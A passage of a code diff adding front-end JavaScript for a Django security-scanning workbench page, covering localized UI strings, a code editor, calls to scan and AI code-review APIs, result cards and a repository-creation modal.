+        emptyAi: "Tafadhali weka msimbo kwa ukaguzi wa AI.",
+        aiConnecting: "Inaunganisha kwa usalama na injini ya Gemma 5B AI...",
+        aiToastStart: "Inawasiliana na Gemma 5B AI...",
+        aiHttpError: "Hitilafu ya muunganisho wa AI: HTTP ",
+        aiDoneToast: "Ukaguzi wa msimbo wa Gemma 5B umekamilika.",
+        aiSseError: "Hitilafu ya mtiririko wa AI: ",
+        noVulnTitle: "Hakuna udhaifu uliogunduliwa!",
+        noVulnDesc: "Msimbo unazingatia kikamilifu viwango vya uhuru wa kidijitali Afrika.",
+        lineLabel: "Mstari",
+        recLabel: "Pendekezo Huru:"
+    },
+    pt: {
+        demoLoaded: "Exemplo de código vulnerável carregado: ",
+        emptyScan: "Por favor, insira o código para analisar.",
+        scanningStatus: "A analisar...",
+        scanningToast: "A analisar com o motor soberano de segurança...",
+        scanError: "Erro durante a auditoria",
+        issuesFoundSuffix: "problema(s) identificado(s)",
+        doneStatus: "Concluído",
+        scanSuccessToast: "Auditoria de segurança concluída! Pontuação de soberania: ",
+        scannerErrorToast: "Erro do scanner: ",
+        emptyAi: "Por favor, insira o código para a revisão IA.",
+        aiConnecting: "A estabelecer ligação segura ao motor local Gemma 5B IA...",
+        aiToastStart: "A consultar o fluxo de revisão Gemma 5B...",
+        aiHttpError: "Erro de ligação IA: HTTP ",
+        aiDoneToast: "Revisão de código pelo Gemma 5B concluída.",
+        aiSseError: "Erro durante a transmissão IA: ",
+        noVulnTitle: "Nenhuma vulnerabilidade detetada!",
+        noVulnDesc: "O código respeita estritamente os critérios de soberania pan-africana.",
+        lineLabel: "Linha",
+        recLabel: "Recomendação Soberana:"
+    }
+};
+
+function getActiveWorkbenchLang() {
+    const match = document.cookie.match(/(?:^|;\s*)(?:bantu_lang|django_language|lang)=([^;]*)/);
+    const raw = (match ? decodeURIComponent(match[1]) : null) || document.documentElement.lang || 'fr';
+    const code = String(raw).toLowerCase().slice(0, 2);
+    return WORKBENCH_I18N[code] ? code : 'fr';
+}
+
+function initCodeEditor() {
+    const mount = document.getElementById('codeEditorMount');
+    const textarea = document.getElementById('scanCodeInput');
+    textarea.value = DEFAULT_SNIPPET;
+
+    if (window.CodeMirror) {
+        editorInstance = CodeMirror(mount, {
+            value: DEFAULT_SNIPPET,
+            mode: "python",
+            theme: "material-darker",
+            lineNumbers: true,
+            indentUnit: 4,
+            lineWrapping: true,
+            autoCloseBrackets: true,
+            gutters: ["CodeMirror-linenumbers"]
+        });
+        textarea.style.display = 'none';
+    } else {
+        textarea.style.display = 'block';
+    }
+}
+
+function getEditorContent() {
+    if (editorInstance) {
+        return editorInstance.getValue();
+    }
+    return document.getElementById('scanCodeInput').value;
+}
+
+function changeEditorMode(modeName) {
+    const key = String(modeName || 'python').toLowerCase();
+    const meta = DEMO_FILES_META[key] || DEMO_FILES_META.python;
+    currentDemoType = DEMO_FILES_META[key] ? key : 'python';
+
+    const selectEl = document.getElementById('editorLangSelect');
+    if (selectEl && selectEl.value !== currentDemoType) {
+        selectEl.value = currentDemoType;
+    }
+
+    const fileTagEl = document.getElementById('editorFileNameTag');
+    if (fileTagEl) {
+        fileTagEl.textContent = meta.filename;
+    }
+
+    document.querySelectorAll('.demo-type-btn').forEach(btn => {
+        if (btn.getAttribute('data-demo-type') === currentDemoType) {
+            btn.style.borderColor = 'var(--primary-african-gold)';
+            btn.style.color = 'var(--primary-african-gold)';
+        } else {
+            btn.style.borderColor = '';
+            btn.style.color = '';
+        }
+    });
+
+    if (editorInstance) {
+        editorInstance.setValue(meta.snippet);
+    }
+    const textarea = document.getElementById('scanCodeInput');
+    if (textarea) {
+        textarea.value = meta.snippet;
+    }
+
+    const t = WORKBENCH_I18N[getActiveWorkbenchLang()];
+    if (window.showToast) {
+        window.showToast(t.demoLoaded + meta.filename + " (" + currentDemoType.toUpperCase() + ")", 'info');
+    }
+}
+window.changeEditorMode = changeEditorMode;
+
+function resetEditorSnippet() {
+    changeEditorMode(currentDemoType || 'python');
+}
+
+// UI-02: Visual Dashboard Updates & Circular Gauge
+function updateSovereigntyGauge(score) {
+    const circle = document.getElementById('gaugeProgressCircle');
+    const scoreText = document.getElementById('gaugeScoreText');
+    const circumference = 2 * Math.PI * 50; // ~314.16
+
+    scoreText.textContent = `${score}%`;
+    const offset = circumference - (score / 100) * circumference;
+    circle.style.strokeDashoffset = offset;
+
+    if (score >= 80) {
+        circle.style.stroke = 'var(--secondary-emerald)';
+        scoreText.style.color = 'var(--secondary-emerald)';
+    } else if (score >= 50) {
+        circle.style.stroke = 'var(--primary-african-gold)';
+        scoreText.style.color = 'var(--primary-african-gold)';
+    } else {
+        circle.style.stroke = '#ef4444';
+        scoreText.style.color = '#ef4444';
+    }
+}
+
+function renderVulnerabilityCards(issues) {
+    const container = document.getElementById('vulnerabilitiesContainer');
+    container.innerHTML = '';
+    const t = WORKBENCH_I18N[getActiveWorkbenchLang()];
+
+    if (!issues || issues.length === 0) {
+        container.innerHTML = `
+            <div style="padding: 1.5rem; text-align: center; background: rgba(16, 185, 129, 0.1); border: 1px solid var(--secondary-emerald); border-radius: 8px; color: #a7f3d0;">
+                <p style="font-weight: 600; margin: 0;">{% icon "circle-check" size=20 %} ${escapeHtml(t.noVulnTitle)}</p>
+                <p style="font-size: 0.85rem; margin: 0.3rem 0 0; opacity: 0.85;">${escapeHtml(t.noVulnDesc)}</p>
+            </div>
+        `;
+        return;
+    }
+
+    issues.forEach(issue => {
+        const card = document.createElement('div');
+        const sevClass = (issue.severity || 'MEDIUM').toLowerCase();
+        card.className = `vulnerability-card sev-${sevClass}`;
+
+        const badgeClass = `badge-${sevClass}`;
+
+        card.innerHTML = `
+            <div class="vulnerability-header">
+                <div>
+                    <strong style="color: #fff; font-size: 0.95rem;">${escapeHtml(issue.description || 'Vulnerability')}</strong>
+                    <span style="font-size: 0.8rem; color: var(--text-muted); margin-left: 0.5rem;">${escapeHtml(t.lineLabel)} ${issue.line || '?'}</span>
+                </div>
+                <span class="severity-badge ${badgeClass}">${escapeHtml(issue.severity || 'UNKNOWN')}</span>
+            </div>
+            ${issue.snippet ? `<div class="vuln-code-snippet">${escapeHtml(issue.snippet)}</div>` : ''}
+            ${issue.recommendation ? `
+                <div class="vuln-recommendation">
+                    <span>{% icon "lightbulb" size=18 %}</span>
+                    <span><strong>${escapeHtml(t.recLabel)}</strong> ${escapeHtml(issue.recommendation)}</span>
+                </div>
+            ` : ''}
+        `;
+        container.appendChild(card);
+    });
+}
+
+function escapeHtml(text) {
+    if (!text) return '';
+    return String(text)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+
+async function runSecurityScan() {
+    const code = getEditorContent();
+    const visualBox = document.getElementById('visualScanContainer');
+    const editorStatus = document.getElementById('editorStatus');
+    const lang = getActiveWorkbenchLang();
+    const t = WORKBENCH_I18N[lang];
+    const meta = DEMO_FILES_META[currentDemoType] || DEMO_FILES_META.python;
+
+    if (!code || !code.trim()) {
+        if (window.showToast) window.showToast(t.emptyScan, "warning");
+        return;
+    }
+
+    editorStatus.textContent = t.scanningStatus;
+    editorStatus.style.color = 'var(--primary-african-gold)';
+    if (window.showToast) window.showToast(t.scanningToast, "info");
+
+    try {
+        const headers = {
+            'Content-Type': 'application/json',
+            'X-Bantu-Workbench': 'interactive-demo'
+        };
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            headers['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const res = await fetch('/api/security/scan/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({
+                content: code,
+                filename: meta.filename,
+                repository_name: 'workbench-repo',
+                lang: lang
+            })
+        });
+        const data = await res.json();
+
+        if (!res.ok) {
+            throw new Error(data.error || data.detail || t.scanError);
+        }
+
+        visualBox.style.display = 'block';
+
+        // Update score & gauge
+        updateSovereigntyGauge(data.sovereignty_score || 0);
+
+        // Update counts
+        document.getElementById('pillCriticalCount').textContent = data.critical || 0;
+        document.getElementById('pillHighCount').textContent = data.high || 0;
+        document.getElementById('pillMediumCount').textContent = data.medium || 0;
+        document.getElementById('issuesCountBadge').textContent = `${data.total_issues || 0} ${t.issuesFoundSuffix}`;
+        if (data.jurisdiction) {
+            const jurEl = document.getElementById('scanJurisdiction');
+            if (jurEl) jurEl.textContent = data.jurisdiction;
+        }
+
+        // Update status rating
+        const ratingBadge = document.getElementById('scanStatusBadge');
+        ratingBadge.textContent = data.status_rating || 'COMPLETED';
+
+        // Render cards
+        renderVulnerabilityCards(data.issues || []);
+
+        editorStatus.textContent = t.doneStatus;
+        editorStatus.style.color = 'var(--secondary-emerald)';
+        if (window.showToast) window.showToast(`${t.scanSuccessToast}${data.sovereignty_score}%`, 'success');
+    } catch(err) {
+        editorStatus.textContent = 'Error';
+        editorStatus.style.color = 'var(--tertiary-terracotta)';
+        if (window.showToast) window.showToast(`${t.scannerErrorToast}${err.message}`, 'error');
+    }
+}
+
+async function runAiReview() {
+    const code = getEditorContent();
+    const aiSection = document.getElementById('aiReviewSection');
+    const aiContent = document.getElementById('aiReviewContent');
+    const lang = getActiveWorkbenchLang();
+    const t = WORKBENCH_I18N[lang];
+    const meta = DEMO_FILES_META[currentDemoType] || DEMO_FILES_META.python;
+
+    if (!code || !code.trim()) {
+        if (window.showToast) window.showToast(t.emptyAi, "warning");
+        return;
+    }
+
+    aiSection.style.display = 'block';
+    aiContent.textContent = t.aiConnecting + '\n';
+    if (window.showToast) window.showToast(t.aiToastStart, "info");
+
+    try {
+        const aiHeaders = {
+            'Content-Type': 'application/json',
+            'Accept': 'text/event-stream, application/json, */*',
+            'X-Bantu-Workbench': 'interactive-demo'
+        };
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            aiHeaders['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const response = await fetch('/api/ai/review/', {
+            method: 'POST',
+            headers: aiHeaders,
+            body: JSON.stringify({
+                code: code,
+                context: `security_audit:${meta.filename}`,
+                lang: lang,
+                stream: true
+            })
+        });
+
+        if (!response.ok) {
+            aiContent.textContent = t.aiHttpError + response.status;
+            if (window.showToast) window.showToast(`${t.aiHttpError}${response.status}`, 'error');
+            return;
+        }
+
+        aiContent.textContent = '';
+        const reader = response.body.getReader();
+        const decoder = new TextDecoder('utf-8');
+        let buffer = '';
+
+        while (true) {
+            const {value, done} = await reader.read();
+            if (done) break;
+            buffer += decoder.decode(value, {stream: true});
+
+            const lines = buffer.split('\n\n');
+            buffer = lines.pop();
+
+            for (const line of lines) {
+                if (line.startsWith('data: ')) {
+                    try {
+                        const payload = JSON.parse(line.substring(6));
+                        if (payload.token) {
+                            aiContent.textContent += payload.token;
+                        }
+                    } catch (e) {
+                        console.error('Parse error:', e);
+                    }
+                }
+            }
+        }
+        if (window.showToast) window.showToast(t.aiDoneToast, "success");
+    } catch(err) {
+        aiContent.textContent = t.aiSseError + err;
+        if (window.showToast) window.showToast(`${t.aiSseError}${err.message}`, 'error');
+    }
+}
+
+// Initialize on DOM ready
+document.addEventListener('DOMContentLoaded', initCodeEditor);
+
+function openNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'flex';
+}
+function closeNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'none';
+}
+async function submitNewDemoRepo() {
+    const name = document.getElementById('modalRepoName').value.trim();
+    const description = document.getElementById('modalRepoDesc').value.trim();
+    const isPrivate = document.getElementById('modalRepoPrivate').checked;
+    const feedback = document.getElementById('modalRepoFeedback');
+    const submitBtn = document.getElementById('btnSubmitNewRepo');
+
+    if (!name) {
+        if (feedback) {
+            feedback.style.display = 'block';
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = '{% trans "Veuillez renseigner un nom de dépôt." %}';
+        }
+        return;
+    }
+
+    if (submitBtn) submitBtn.disabled = true;
+    if (feedback) {
+        feedback.style.display = 'block';
+        feedback.style.background = 'rgba(16, 185, 129, 0.1)';
+        feedback.style.color = '#10b981';
+        feedback.textContent = '{% trans "Création du dépôt sur la forge en cours..." %}';
+    }
+
+    try {
+        const headers = {'Content-Type': 'application/json'};
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            headers['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const res = await fetch('/api/forge/repositories/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({name, description, private: isPrivate})
+        });
+        const data = await res.json();
+        if (res.ok) {
+            feedback.style.background = 'rgba(16, 185, 129, 0.2)';
+            feedback.style.color = '#10b981';
+            feedback.textContent = '{% trans "Dépôt créé avec succès !" %}';
+            if (window.showToast) window.showToast(`Dépôt ${name} créé avec succès !`, 'success');
+            setTimeout(() => {
+                closeNewRepoModal();
+                window.location.reload();
+            }, 1000);
+        } else {
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = data.error || '{% trans "Échec de création du dépôt." %}';
+        }
+    } catch (err) {
+        feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+        feedback.style.color = '#ef4444';
+        feedback.textContent = err.message || '{% trans "Erreur de connexion." %}';
+    } finally {
+        if (submitBtn) submitBtn.disabled = false;
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    if (window.location.hash === '#new-repo') {
+        setTimeout(openNewRepoModal, 400);
+    }
+});
+
+</script>
+
+{% endblock %}
